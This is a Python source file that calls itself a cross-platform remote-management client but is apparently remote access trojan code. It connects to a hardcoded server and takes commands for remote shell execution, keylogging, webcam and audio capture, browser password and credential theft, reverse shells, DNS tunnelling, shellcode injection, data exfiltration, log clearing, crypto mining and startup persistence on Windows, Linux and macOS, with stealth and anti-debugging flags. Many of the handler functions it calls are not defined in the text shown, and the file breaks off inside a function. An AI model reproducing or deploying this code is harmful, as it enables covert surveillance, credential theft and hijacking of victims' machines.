#!/usr/bin/env python3
"""
Universal Client - Cross-platform client for remote management
Supports Windows, Linux, and macOS
"""

import json
import os
import socket
import subprocess
import threading
import time
import platform
import sys
import logging
import base64
import shutil
import stat
from pathlib import Path
from datetime import datetime

# Try to import platform-specific modules
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("Warning: psutil not available. Some features may be limited.")

# Try to import screenshot libraries
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    try:
        import pyscreenshot as ImageGrab
        SCREENSHOT_AVAILABLE = True
    except ImportError:
        SCREENSHOT_AVAILABLE = False
        print("Warning: Screenshot libraries not available. Install PIL or pyscreenshot.")

# Try to import clipboard
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False
    print("Warning: pyperclip not available. Clipboard features disabled.")

# Try to import encryption
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    ENCRYPTION_AVAILABLE = True
except ImportError:
    ENCRYPTION_AVAILABLE = False
    print("Warning: cryptography not available. Encryption features disabled.")

# Try to import keylogging
try:
    import pynput
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("Warning: pynput not available. Keylogging features disabled.")

# Try to import webcam
try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False
    print("Warning: opencv-python not available. Webcam features disabled.")

# Try to import audio
try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    print("Warning: pyaudio not available. Audio recording features disabled.")

# Try to import compression
try:
    import gzip
    import zlib
    COMPRESSION_AVAILABLE = True
except ImportError:
    COMPRESSION_AVAILABLE = False

# Try to import packet capture
try:
    from scapy.all import sniff, IP, TCP, UDP, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Warning: scapy not available. Packet capture features disabled.")

# Try to import steganography
try:
    from PIL import Image
    STEGANOGRAPHY_AVAILABLE = True
except ImportError:
    STEGANOGRAPHY_AVAILABLE = False

# Windows-specific imports
if platform.system() == 'Windows':
    try:
        import winreg as reg
        WINDOWS_REG_AVAILABLE = True
    except ImportError:
        WINDOWS_REG_AVAILABLE = False
else:
    WINDOWS_REG_AVAILABLE = False

# Configuration
CONFIG_FILE = 'client_config.json'
DEFAULT_CONFIG = {
    'server_host': '192.168.0.104',
    'server_port': 12345,
    'reconnect_interval': 30,
    'socket_timeout': 30.0,
    'keepalive_interval': 60,
    'log_level': 'INFO',
    'log_file': 'client.log',
    'startup_enabled': True,
    'client_name': None,  # Auto-detect if None
    'encryption_enabled': False,
    'encryption_key': None,
    'keylogging_enabled': False,
    'stealth_mode': False,
    'compression_enabled': True,
    'anti_debugging': True,
    'process_injection': False,
    'resource_limit_cpu': 50,  # Max CPU percentage
    'resource_limit_memory': 512,  # Max memory in MB
    'evasion_techniques': True,
    'multi_threading': True,
    'error_recovery': True
}

# Global variables
is_running = True
server_host = None
server_port = None
mining_process = None
startup_added = False
logger = None
config = {}
encryption_key = None
keylogger_thread = None
keylog_buffer = []
keylog_lock = threading.Lock()
command_queue = []
queue_lock = threading.Lock()
reverse_shell_socket = None
packet_capture_active = False
packet_capture_thread = None
file_monitor_active = False
file_monitor_thread = None
monitored_paths = []
database_connection = None
plugin_registry = {}
multi_server_hosts = []
current_server_index = 0
command_batch_queue = []
batch_lock = threading.Lock()
memory_dump_active = False
credential_cache = {}

def setup_logging(log_level='INFO', log_file='client.log'):
    """Setup logging configuration"""
    global logger
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    logging.basicConfig(
        level=getattr(logging, log_level.upper(), logging.INFO),
        format=log_format,
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    logger = logging.getLogger(__name__)

def load_config():
    """Load configuration from file or create default"""
    global config, server_host, server_port
    config_path = Path(CONFIG_FILE)
    
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            logger.info(f"Configuration loaded from {CONFIG_FILE}")
        except Exception as e:
            logger.warning(f"Error loading config: {e}. Using defaults.")
            config = DEFAULT_CONFIG.copy()
    else:
        config = DEFAULT_CONFIG.copy()
        save_config()
        logger.info(f"Created default configuration file: {CONFIG_FILE}")
    
    # Update globals
    server_host = config.get('server_host', DEFAULT_CONFIG['server_host'])
    server_port = config.get('server_port', DEFAULT_CONFIG['server_port'])

def save_config():
    """Save current configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")

def encrypt_data(data):
    """Encrypt data if encryption is enabled"""
    global encryption_key
    if not config.get('encryption_enabled', False) or not ENCRYPTION_AVAILABLE:
        return data
    
    try:
        if encryption_key is None:
            key_str = config.get('encryption_key')
            if key_str:
                encryption_key = Fernet(key_str.encode())
            else:
                return data
        
        encrypted = encryption_key.encrypt(data.encode() if isinstance(data, str) else data)
        return base64.b64encode(encrypted).decode('utf-8') if isinstance(data, str) else encrypted
    except Exception as e:
        logger.error(f"Encryption error: {e}")
        return data

def decrypt_data(data):
    """Decrypt data if encryption is enabled"""
    global encryption_key
    if not config.get('encryption_enabled', False) or not ENCRYPTION_AVAILABLE:
        return data
    
    try:
        if encryption_key is None:
            key_str = config.get('encryption_key')
            if key_str:
                encryption_key = Fernet(key_str.encode())
            else:
                return data
        
        if isinstance(data, str):
            data = base64.b64decode(data.encode())
        decrypted = encryption_key.decrypt(data)
        return decrypted.decode('utf-8') if isinstance(decrypted, bytes) else decrypted
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        return data

def compress_data(data):
    """Compress data if compression is enabled"""
    if not config.get('compression_enabled', True) or not COMPRESSION_AVAILABLE:
        return data
    
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        compressed = gzip.compress(data)
        return base64.b64encode(compressed).decode('utf-8')
    except Exception as e:
        logger.error(f"Compression error: {e}")
        return data

def decompress_data(data):
    """Decompress data if compression is enabled"""
    if not config.get('compression_enabled', True) or not COMPRESSION_AVAILABLE:
        return data
    
    try:
        if isinstance(data, str):
            data = base64.b64decode(data.encode())
        decompressed = gzip.decompress(data)
        return decompressed.decode('utf-8')
    except Exception as e:
        logger.error(f"Decompression error: {e}")
        return data

def send_message(sock, message):
    """Send message with delimiter (with optional encryption/compression)"""
    try:
        # Compress if enabled
        if config.get('compression_enabled', True):
            message = compress_data(message)
        
        # Encrypt if enabled
        if config.get('encryption_enabled', False):
            message = encrypt_data(message)
        
        sock.send((message + '\n').encode('utf-8'))
        return True
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return False

def send_file_data(sock, data, chunk_size=8192):
    """Send binary file data"""
    try:
        # Send size first
        size = len(data)
        sock.send(f"FILE_SIZE:{size}\n".encode('utf-8'))
        # Send data in chunks
        sent = 0
        while sent < size:
            chunk = data[sent:sent+chunk_size]
            sock.send(chunk)
            sent += len(chunk)
        return True
    except Exception as e:
        logger.error(f"Error sending file data: {e}")
        return False

def receive_file_data(sock, expected_size):
    """Receive binary file data"""
    try:
        data = b''
        while len(data) < expected_size:
            chunk = sock.recv(min(8192, expected_size - len(data)))
            if not chunk:
                break
            data += chunk
        return data
    except Exception as e:
        logger.error(f"Error receiving file data: {e}")
        return None

def handle_server_commands(client_socket):
    """Handle commands from server"""
    global mining_process
    reconnect_interval = config.get('reconnect_interval', 30)
    socket_timeout = config.get('socket_timeout', 30.0)
    
    # Send initial connection message with client info
    try:
        client_info = {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'client_name': config.get('client_name') or socket.gethostname()
        }
        send_message(client_socket, f"CLIENT:connected:{json.dumps(client_info)}")
    except Exception as e:
        logger.error(f"Error sending connection message: {e}")
    
    while is_running:
        try:
            client_socket.settimeout(socket_timeout)
            data = b''
            while b'\n' not in data:
                chunk = client_socket.recv(1024)
                if not chunk:
                    raise ConnectionResetError("Connection closed by server")
                data += chunk
            command = data.decode('utf-8').strip()
            
            # Decrypt if enabled
            if config.get('encryption_enabled', False):
                try:
                    command = decrypt_data(command)
                except:
                    pass  # If decryption fails, use as-is
            
            # Decompress if enabled
            if config.get('compression_enabled', True):
                try:
                    command = decompress_data(command)
                except:
                    pass  # If decompression fails, use as-is
            
            if not command:
                continue
            
            logger.debug(f"Received command: {command}")
            
            if command.startswith("message:"):
                show_message(command)
                send_message(client_socket, "ACK:message_displayed")
            elif command == "get_system_info":
                system_info = get_system_info()
                send_message(client_socket, system_info)
            elif command.startswith("start_mining:"):
                mining_path = command.split(":", 1)[1].strip()
                result = start_mining(mining_path)
                send_message(client_socket, f"ACK:mining_started:{result}")
            elif command == "stop_mining":
                result = stop_mining()
                send_message(client_socket, f"ACK:mining_stopped:{result}")
            elif command == "ping":
                send_message(client_socket, "ACK:pong")
            elif command.startswith("execute:"):
                cmd = command.split(":", 1)[1].strip()
                result = execute_command(cmd)
                send_message(client_socket, f"ACK:execute_result:{result}")
            elif command == "get_config":
                send_message(client_socket, f"CONFIG:{json.dumps(config)}")
            # New features
            elif command == "screenshot":
                screenshot_data = take_screenshot()
                send_message(client_socket, f"SCREENSHOT:{screenshot_data}")
            elif command == "list_processes":
                processes = list_processes()
                send_message(client_socket, f"PROCESSES:{processes}")
            elif command.startswith("kill_process:"):
                pid = command.split(":", 1)[1].strip()
                result = kill_process(pid)
                send_message(client_socket, f"ACK:kill_process:{result}")
            elif command.startswith("list_files:"):
                path = command.split(":", 1)[1].strip() if ":" in command else ""
                files = list_files(path)
                send_message(client_socket, f"FILES:{files}")
            elif command.startswith("read_file:"):
                file_path = command.split(":", 1)[1].strip()
                file_data = read_file(file_path)
                send_message(client_socket, f"FILE_DATA:{file_data}")
            elif command.startswith("write_file:"):
                # Format: write_file:path|base64data
                parts = command.split(":", 1)[1].split("|", 1)
                if len(parts) == 2:
                    file_path, file_data = parts
                    result = write_file(file_path, file_data)
                    send_message(client_socket, f"ACK:write_file:{result}")
                else:
                    send_message(client_socket, "ACK:write_file:error:invalid_format")
            elif command.startswith("delete_file:"):
                file_path = command.split(":", 1)[1].strip()
                result = delete_file(file_path)
                send_message(client_socket, f"ACK:delete_file:{result}")
            elif command == "get_clipboard":
                clipboard = get_clipboard()
                if clipboard.startswith("error:"):
                    send_message(client_socket, f"CLIPBOARD:{clipboard}")
                else:
                    send_message(client_socket, f"CLIPBOARD:{base64.b64encode(clipboard.encode('utf-8')).decode('utf-8')}")
            elif command.startswith("set_clipboard:"):
                text = base64.b64decode(command.split(":", 1)[1].strip()).decode('utf-8')
                result = set_clipboard(text)
                send_message(client_socket, f"ACK:set_clipboard:{result}")
            elif command == "get_network_connections":
                connections = get_network_connections()
                send_message(client_socket, f"NETWORK_CONNECTIONS:{connections}")
            elif command == "get_installed_software":
                software = get_installed_software()
                send_message(client_socket, f"SOFTWARE:{software}")
            elif command == "get_environment_variables":
                env_vars = get_environment_variables()
                send_message(client_socket, f"ENV_VARS:{env_vars}")
            elif command.startswith("get_system_logs:"):
                count = int(command.split(":", 1)[1].strip()) if ":" in command else 50
                logs = get_system_logs(count)
                send_message(client_socket, f"SYSTEM_LOGS:{logs}")
            elif command == "get_browser_history":
                history = get_browser_history()
                send_message(client_socket, f"BROWSER_HISTORY:{history}")
            elif command == "get_real_time_stats":
                stats = get_real_time_stats()
                send_message(client_socket, f"REAL_TIME_STATS:{stats}")
            elif command.startswith("scan_network:"):
                subnet = command.split(":", 1)[1].strip() if ":" in command else None
                scan_result = scan_network(subnet)
                send_message(client_socket, f"NETWORK_SCAN:{scan_result}")
            # Advanced features
            elif command == "start_keylogger":
                result = start_keylogger()
                send_message(client_socket, f"ACK:start_keylogger:{result}")
            elif command == "stop_keylogger":
                result = stop_keylogger()
                send_message(client_socket, f"ACK:stop_keylogger:{result}")
            elif command == "get_keylog_data":
                keylog_data = get_keylog_data()
                send_message(client_socket, f"KEYLOG_DATA:{keylog_data}")
            elif command.startswith("capture_webcam:"):
                duration = int(command.split(":", 1)[1].strip()) if ":" in command else 5
                webcam_data = capture_webcam(duration)
                send_message(client_socket, f"WEBCAM_DATA:{webcam_data}")
            elif command.startswith("record_audio:"):
                duration = int(command.split(":", 1)[1].strip()) if ":" in command else 5
                audio_data = record_audio(duration)
                send_message(client_socket, f"AUDIO_DATA:{audio_data}")
            elif command.startswith("read_registry:"):
                # Format: read_registry:key_path|value_name
                parts = command.split(":", 1)[1].split("|", 1)
                key_path = parts[0]
                value_name = parts[1] if len(parts) > 1 else None
                reg_data = read_registry_key(key_path, value_name)
                send_message(client_socket, f"REGISTRY_DATA:{reg_data}")
            elif command.startswith("write_registry:"):
                # Format: write_registry:key_path|value_name|value|type
                parts = command.split(":", 1)[1].split("|")
                if len(parts) >= 3:
                    key_path, value_name, value = parts[0], parts[1], parts[2]
                    reg_type = parts[3] if len(parts) > 3 else "REG_SZ"
                    result = write_registry_key(key_path, value_name, value, reg_type)
                    send_message(client_socket, f"ACK:write_registry:{result}")
                else:
                    send_message(client_socket, "ACK:write_registry:error:invalid_format")
            elif command == "list_services":
                services = list_services()
                send_message(client_socket, f"SERVICES:{services}")
            elif command.startswith("control_service:"):
                # Format: control_service:service_name|action
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    service_name, action = parts[0], parts[1]
                    result = control_service(service_name, action)
                    send_message(client_socket, f"ACK:control_service:{result}")
                else:
                    send_message(client_socket, "ACK:control_service:error:invalid_format")
            elif command == "extract_browser_passwords":
                passwords = extract_browser_passwords()
                send_message(client_socket, f"BROWSER_PASSWORDS:{passwords}")
            elif command.startswith("create_scheduled_task:"):
                # Format: create_scheduled_task:task_name|command|schedule
                parts = command.split(":", 1)[1].split("|")
                if len(parts) >= 2:
                    task_name, command_cmd = parts[0], parts[1]
                    schedule = parts[2] if len(parts) > 2 else "daily"
                    result = create_scheduled_task(task_name, command_cmd, schedule)
                    send_message(client_socket, f"ACK:create_task:{result}")
                else:
                    send_message(client_socket, "ACK:create_task:error:invalid_format")
            # Ultra advanced features
            elif command.startswith("start_remote_desktop:"):
                interval = float(command.split(":", 1)[1].strip()) if ":" in command else 1.0
                desktop_data = start_remote_desktop_stream(interval)
                send_message(client_socket, f"REMOTE_DESKTOP:{desktop_data}")
            elif command.startswith("start_packet_capture:"):
                # Format: start_packet_capture:count|interface
                parts = command.split(":", 1)[1].split("|")
                count = int(parts[0]) if parts[0].isdigit() else 100
                interface = parts[1] if len(parts) > 1 else None
                result = start_packet_capture(count, interface)
                send_message(client_socket, f"ACK:packet_capture:{result}")
            elif command == "get_captured_packets":
                packets = get_captured_packets()
                send_message(client_socket, f"PACKETS:{packets}")
            elif command.startswith("start_reverse_shell:"):
                # Format: start_reverse_shell:host|port
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    result = start_reverse_shell(parts[0], parts[1])
                    send_message(client_socket, f"ACK:reverse_shell:{result}")
                else:
                    send_message(client_socket, "ACK:reverse_shell:error:invalid_format")
            elif command.startswith("search_files:"):
                # Format: search_files:directory|pattern|file_type
                parts = command.split(":", 1)[1].split("|")
                directory = parts[0] if len(parts) > 0 else "."
                pattern = parts[1] if len(parts) > 1 else "*"
                file_type = parts[2] if len(parts) > 2 else None
                results = search_files(directory, pattern, file_type)
                send_message(client_socket, f"SEARCH_RESULTS:{results}")
            elif command.startswith("grep_file:"):
                # Format: grep_file:file_path|pattern
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    results = grep_file(parts[0], parts[1])
                    send_message(client_socket, f"GREP_RESULTS:{results}")
                else:
                    send_message(client_socket, "GREP_RESULTS:error:invalid_format")
            elif command.startswith("start_file_monitor:"):
                paths = command.split(":", 1)[1].split("|")
                result = start_file_monitor(paths)
                send_message(client_socket, f"ACK:file_monitor:{result}")
            elif command == "stop_file_monitor":
                result = stop_file_monitor()
                send_message(client_socket, f"ACK:file_monitor:{result}")
            elif command.startswith("hide_file:"):
                file_path = command.split(":", 1)[1].strip()
                result = hide_file(file_path)
                send_message(client_socket, f"ACK:hide_file:{result}")
            elif command == "clear_logs":
                result = clear_logs()
                send_message(client_socket, f"LOGS_CLEARED:{result}")
            elif command.startswith("embed_steganography:"):
                # Format: embed_steganography:image_path|data
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    result = embed_steganography(parts[0], parts[1])
                    send_message(client_socket, f"ACK:steganography:{result}")
                else:
                    send_message(client_socket, "ACK:steganography:error:invalid_format")
            elif command.startswith("extract_steganography:"):
                image_path = command.split(":", 1)[1].strip()
                result = extract_steganography(image_path)
                send_message(client_socket, f"STEGANOGRAPHY_DATA:{base64.b64encode(result.encode('utf-8')).decode('utf-8')}")
            elif command == "get_detailed_system_info":
                detailed_info = get_detailed_system_info()
                send_message(client_socket, detailed_info)
             # Extreme advanced features
            elif command == "detect_vm_sandbox":
                detection_result = detect_vm_sandbox()
                send_message(client_socket, f"VM_DETECTION:{detection_result}")
            elif command.startswith("start_dns_tunnel:"):
                # Format: start_dns_tunnel:domain|port
                parts = command.split(":", 1)[1].split("|")
                domain = parts[0]
                port = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 53
                result = start_dns_tunnel(domain, port)
                send_message(client_socket, f"ACK:dns_tunnel:{result}")
            elif command == "stop_dns_tunnel":
                result = stop_dns_tunnel()
                send_message(client_socket, f"ACK:dns_tunnel:{result}")
            elif command.startswith("add_scheduled_task:"):
                # Format: add_scheduled_task:name|command|schedule_time|repeat
                parts = command.split(":", 1)[1].split("|")
                if len(parts) >= 3:
                    name, cmd, schedule = parts[0], parts[1], parts[2]
                    repeat = parts[3].lower() == "true" if len(parts) > 3 else False
                    result = add_scheduled_task(name, cmd, schedule, repeat)
                    send_message(client_socket, f"ACK:scheduled_task:{result}")
                else:
                    send_message(client_socket, "ACK:scheduled_task:error:invalid_format")
            elif command == "start_task_scheduler":
                result = start_task_scheduler()
                send_message(client_socket, f"ACK:task_scheduler:{result}")
            elif command == "stop_task_scheduler":
                result = stop_task_scheduler()
                send_message(client_socket, f"ACK:task_scheduler:{result}")
            elif command == "list_scheduled_tasks":
                tasks = list_scheduled_tasks()
                send_message(client_socket, f"SCHEDULED_TASKS:{tasks}")
            elif command.startswith("inject_shellcode:"):
                # Format: inject_shellcode:hex_shellcode|process_name
                parts = command.split(":", 1)[1].split("|")
                shellcode_hex = parts[0]
                process_name = parts[1] if len(parts) > 1 else None
                result = inject_shellcode(shellcode_hex, process_name)
                send_message(client_socket, f"ACK:shellcode_injection:{result}")
            elif command == "create_persistence_multiple":
                result = create_persistence_multiple()
                send_message(client_socket, f"PERSISTENCE:{result}")
            elif command.startswith("exfiltrate_data:"):
                # Format: exfiltrate_data:data|method
                parts = command.split(":", 1)[1].split("|")
                data = parts[0]
                method = parts[1] if len(parts) > 1 else "all"
                result = exfiltrate_data(data, method)
                send_message(client_socket, f"EXFILTRATION:{result}")
            elif command == "get_network_interfaces_detailed":
                interfaces = get_network_interfaces_detailed()
                send_message(client_socket, f"NETWORK_INTERFACES:{interfaces}")
            elif command.startswith("create_backdoor_port:"):
                port = command.split(":", 1)[1].strip()
                result = create_backdoor_port(port)
                send_message(client_socket, f"ACK:backdoor:{result}")
            # Ultimate advanced features
            elif command.startswith("dump_memory:"):
                pid = command.split(":", 1)[1].strip()
                memory_data = dump_process_memory(pid)
                send_message(client_socket, f"MEMORY_DUMP:{memory_data}")
            elif command == "harvest_credentials":
                credentials = harvest_credentials()
                send_message(client_socket, f"CREDENTIALS:{credentials}")
            elif command.startswith("add_multi_server:"):
                # Format: add_multi_server:host|port
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    result = add_multi_server(parts[0], parts[1])
                    send_message(client_socket, f"ACK:multi_server:{result}")
                else:
                    send_message(client_socket, "ACK:multi_server:error:invalid_format")
            elif command == "switch_server":
                result = switch_server()
                send_message(client_socket, f"ACK:server_switch:{result}")
            elif command.startswith("queue_batch:"):
                commands_json = command.split(":", 1)[1]
                result = queue_batch_commands(commands_json)
                send_message(client_socket, f"ACK:batch_queue:{result}")
            elif command == "execute_batch":
                results = execute_batch_commands()
                send_message(client_socket, f"BATCH_RESULTS:{results}")
            elif command.startswith("load_plugin:"):
                plugin_code = base64.b64decode(command.split(":", 1)[1].strip()).decode('utf-8')
                result = load_plugin(plugin_code)
                send_message(client_socket, f"ACK:plugin:{result}")
            elif command == "list_plugins":
                plugins = list_plugins()
                send_message(client_socket, f"PLUGINS:{plugins}")
            elif command.startswith("init_database:"):
                db_path = command.split(":", 1)[1].strip() if ":" in command else "client_data.db"
                result = init_database(db_path)
                send_message(client_socket, f"ACK:database:{result}")
            elif command.startswith("save_to_database:"):
                # Format: save_to_database:table|data_json
                parts = command.split(":", 1)[1].split("|", 1)
                if len(parts) == 2:
                    table, data_json = parts[0], parts[1]
                    data = json.loads(data_json)
                    result = save_to_database(table, data)
                    send_message(client_socket, f"ACK:database_save:{result}")
                else:
                    send_message(client_socket, "ACK:database_save:error:invalid_format")
            elif command.startswith("query_database:"):
                query = command.split(":", 1)[1]
                results = query_database(query)
                send_message(client_socket, f"DATABASE_QUERY:{results}")
            elif command.startswith("encrypt_file:"):
                # Format: encrypt_file:file_path|key
                parts = command.split(":", 1)[1].split("|")
                file_path = parts[0]
                key = parts[1] if len(parts) > 1 else None
                result = encrypt_file(file_path, key)
                send_message(client_socket, f"FILE_ENCRYPT:{result}")
            elif command.startswith("decrypt_file:"):
                # Format: decrypt_file:file_path|key
                parts = command.split(":", 1)[1].split("|")
                if len(parts) == 2:
                    file_path, key = parts[0], parts[1]
                    result = decrypt_file(file_path, key)
                    send_message(client_socket, f"FILE_DECRYPT:{result}")
                else:
                    send_message(client_socket, "FILE_DECRYPT:error:invalid_format")
            elif command == "get_system_hardening":
                hardening = get_system_hardening_info()
                send_message(client_socket, f"HARDENING:{hardening}")
            elif command == "create_advanced_persistence":
                result = create_advanced_persistence()
                send_message(client_socket, f"ADV_PERSISTENCE:{result}")
            else:
                send_message(client_socket, f"ACK:unknown_command:{command}")
        except socket.timeout:
            try:
                send_message(client_socket, "CLIENT:keepalive")
            except:
                raise ConnectionResetError("Connection lost")
        except ConnectionResetError:
            logger.warning("Connection lost. Server may have shut down.")
            break
        except socket.error as e:
            logger.error(f"Socket error: {e}")
            break
        except Exception as e:
            logger.error(f"Unexpected error: {e}", exc_info=True)
            break

def execute_command(cmd):
    """Execute a shell command (with safety checks)"""
    try:
        # Basic safety - prevent dangerous commands
        dangerous = ['rm -rf', 'format', 'del /f', 'shutdown', 'reboot']
        if any(d in cmd.lower() for d in dangerous):
            return "error:command_blocked_for_safety"
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return f"exit_code:{result.returncode}|stdout:{result.stdout[:500]}|stderr:{result.stderr[:500]}"
    except subprocess.TimeoutExpired:
        return "error:command_timeout"
    except Exception as e:
        return f"error:{str(e)}"

def add_to_startup(file_path=""):
    """Add client to system startup (cross-platform)"""
    system = platform.system()
    
    if file_path == "":
        file_path = os.path.abspath(__file__)
    
    try:
        if system == 'Windows' and WINDOWS_REG_AVAILABLE:
            # Windows registry method
            p_name = os.path.basename(file_path)
            if not p_name.endswith('.exe'):
                p_name = p_name + '.exe'
            new_file_path = os.path.join(os.path.dirname(file_path), p_name)
            
            key = reg.HKEY_CURRENT_USER
            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(reg_key, "ClientService", 0, reg.REG_SZ, new_file_path)
            reg.CloseKey(reg_key)
            logger.info("Added to Windows startup registry")
            
        elif system == 'Linux':
            # Linux systemd user service or autostart
            home = os.path.expanduser('~')
            autostart_dir = os.path.join(home, '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_file = os.path.join(autostart_dir, 'client.desktop')
            with open(desktop_file, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=Client Service
Exec=python3 {file_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            logger.info("Added to Linux autostart")
            
        elif system == 'Darwin':  # macOS
            # macOS LaunchAgent
            home = os.path.expanduser('~')
            launch_agents = os.path.join(home, 'Library', 'LaunchAgents')
            os.makedirs(launch_agents, exist_ok=True)
            
            plist_file = os.path.join(launch_agents, 'com.client.service.plist')
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.client.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{file_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            logger.info("Added to macOS LaunchAgents")
        else:
            logger.warning(f"Startup persistence not implemented for {system}")
            return False
        return True
    except Exception as e:
        logger.error(f"Error adding to startup: {e}")
        return False

def show_message(message):
    """Display message to user (cross-platform)"""
    try:
        clean_message = message.replace('message:', '').strip()
        system = platform.system()
        
        if system == 'Windows':
            # Windows VBScript message box
            clean_message = clean_message.replace('"', '""')
            vbscript_content = f'MsgBox "{clean_message}", 262192, "Server Message"'
            vbs_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "message_popup.vbs")
            with open(vbs_file, "w") as f:
                f.write(vbscript_content)
            subprocess.Popen(["wscript", vbs_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            threading.Timer(5.0, lambda: os.remove(vbs_file) if os.path.exists(vbs_file) else None).start()
            
        elif system == 'Linux':
            # Linux notify-send or zenity
            try:
                subprocess.Popen(["notify-send", "Server Message", clean_message], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                try:
                    subprocess.Popen(["zenity", "--info", "--text", clean_message, "--title", "Server Message"],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    print(f"Server Message: {clean_message}")
                    
        elif system == 'Darwin':  # macOS
            # macOS osascript
            script = f'display notification "{clean_message}" with title "Server Message"'
            subprocess.Popen(["osascript", "-e", script], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            print(f"Server Message: {clean_message}")
    except Exception as e:
        logger.error(f"Error showing message: {e}")

def get_system_info():
    """Get comprehensive system information"""
    try:
        info = {
            "platform": platform.system(),
            "platform-release": platform.release(),
            "platform-version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip-address": get_local_ip(),
            "cpu": platform.processor() or "Unknown",
            "python-version": sys.version.split()[0],
        }
        
        # Add memory info if psutil available
        if PSUTIL_AVAILABLE:
            try:
                mem = psutil.virtual_memory()
                info["memory-total"] = mem.total
                info["memory-available"] = mem.available
                info["memory-percent"] = mem.percent
                info["cpu-count"] = psutil.cpu_count()
                info["cpu-percent"] = psutil.cpu_percent(interval=1)
            except:
                pass
        
        # Add disk info
        try:
            disk = os.statvfs('/' if platform.system() != 'Windows' else 'C:\\')
            if platform.system() != 'Windows':
                info["disk-total"] = disk.f_blocks * disk.f_frsize
                info["disk-free"] = disk.f_bavail * disk.f_frsize
        except:
            pass
        
        # Add network interfaces
        try:
            interfaces = []
            for interface, addrs in psutil.net_if_addrs().items() if PSUTIL_AVAILABLE else {}:
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append({"interface": interface, "ip": addr.address})
            info["network-interfaces"] = interfaces
        except:
            pass
        
        return json.dumps(info, indent=2)
    except Exception as e:
        logger.error(f"Error obtaining system info: {e}")
        return json.dumps({"error": str(e)})

def get_local_ip():
    """Get local IP address (improved method)"""
    try:
        # Try connecting to a remote address to determine local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Doesn't actually connect, just determines the local IP
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        except:
            ip = socket.gethostbyname(socket.gethostname())
        finally:
            s.close()
        return ip
    except Exception as e:
        logger.error(f"Error obtaining local IP: {e}")
        return "Not available"

def start_mining(mining_path):
    """Start mining process"""
    global mining_process
    try:
        if mining_process is not None and mining_process.poll() is None:
            return "already_running"
        
        if not os.path.exists(mining_path):
            return f"error:path_not_found:{mining_path}"
        
        # Make executable on Unix systems
        if platform.system() != 'Windows':
            os.chmod(mining_path, 0o755)
        
        mining_process = subprocess.Popen(
            [mining_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        logger.info(f"Started mining process (PID: {mining_process.pid})")
        return f"success:pid_{mining_process.pid}"
    except Exception as e:
        logger.error(f"Failed to start mining: {e}")
        return f"error:{str(e)}"

def stop_mining():
    """Stop mining process"""
    global mining_process
    try:
        if mining_process is None:
            # Try to find and kill any mining processes
            killed = False
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if any(keyword in proc_name for keyword in ['xmrig', 'miner', 'mining']):
                            proc.kill()
                            killed = True
                            logger.info(f"Killed mining process (PID: {proc.info['pid']})")
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            return "success:no_tracked_process_killed_external" if killed else "info:no_process_found"
        
        if mining_process.poll() is None:
            mining_process.terminate()
            try:
                mining_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                mining_process.kill()
            logger.info("Stopped mining process")
            mining_process = None
